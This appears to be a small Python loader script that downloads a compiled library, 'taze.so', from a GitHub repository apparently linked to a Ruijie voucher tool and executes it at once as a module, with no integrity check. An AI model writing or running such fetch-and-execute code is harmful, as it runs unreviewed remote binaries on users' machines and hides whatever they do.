import urllib.request
import importlib.util
from pathlib import Path

SO_URL = "https://raw.githubusercontent.com/plusprovpn/tazeteam-voucher/main/taze.so"
SO_FILE = "taze.so"

print("[*] Downloading core...")
urllib.request.urlretrieve(SO_URL, SO_FILE)
print("[+] Download complete")

p = Path(SO_FILE).resolve()
spec = importlib.util.spec_from_file_location("ruijie_core", str(p))
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)

print("[+] Core loaded")
